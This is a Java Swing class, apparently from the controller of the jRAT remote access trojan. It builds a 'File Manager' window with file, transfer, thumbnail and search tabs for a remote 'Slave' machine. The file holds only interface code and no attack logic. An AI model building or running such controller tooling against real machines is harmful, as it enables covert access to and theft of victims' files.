package io.jrat.controller.ui.frames;

import iconlib.IconUtils;
import io.jrat.controller.Slave;
import io.jrat.controller.ui.panels.PanelFileTransfers;
import io.jrat.controller.ui.panels.PanelRemoteFiles;
import io.jrat.controller.ui.panels.PanelSearchFiles;
import io.jrat.controller.ui.panels.PanelThumbView;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Toolkit;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;
import java.util.Map;
import javax.swing.JTabbedPane;
import javax.swing.WindowConstants;

@SuppressWarnings("serial")
public class FrameRemoteFiles extends BaseFrame {
	
	private JTabbedPane tabbedPane;
	private PanelRemoteFiles remoteFiles;
	private PanelSearchFiles searchPanel;
	private PanelThumbView thumbPanel;
	
	public static final Map<Slave, FrameRemoteFiles> INSTANCES = new HashMap<Slave, FrameRemoteFiles>();

	public FrameRemoteFiles(Slave slave) {
		super(slave);
		INSTANCES.put(slave, this);
		setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);

		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});

		setBounds(100, 100, 760, 500);
		setLayout(new BorderLayout(0, 0));
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteFiles.class.getResource("/icons/folder-tree.png")));

		setTitle("File Manager");

		remoteFiles = new PanelRemoteFiles(slave, this);
		
		searchPanel = new PanelSearchFiles(slave, this);
		thumbPanel = new PanelThumbView(slave);
		
		tabbedPane = new JTabbedPane();
		tabbedPane.addTab("Files", IconUtils.getIcon("folder-tree"), remoteFiles);
		tabbedPane.addTab("Transfers", IconUtils.getIcon("arrow-down"), PanelFileTransfers.instance);
		tabbedPane.addTab("Thumbnails", IconUtils.getIcon("images-stack"), thumbPanel);
		tabbedPane.addTab("Search", IconUtils.getIcon("folder-search"), searchPanel);
		
		add(tabbedPane, BorderLayout.CENTER);	
	}

	public void exit() {
		INSTANCES.remove(slave);
	}
	
	public PanelRemoteFiles getFilesPanel() {
		return remoteFiles;
	}

	public PanelSearchFiles getSearchPanel() {
		return searchPanel;
	}
	
	public PanelThumbView getThumbPanel() {
		return thumbPanel;
	}
	
	public void setTab(Component tab) {
		tabbedPane.setSelectedComponent(tab);
	}

}
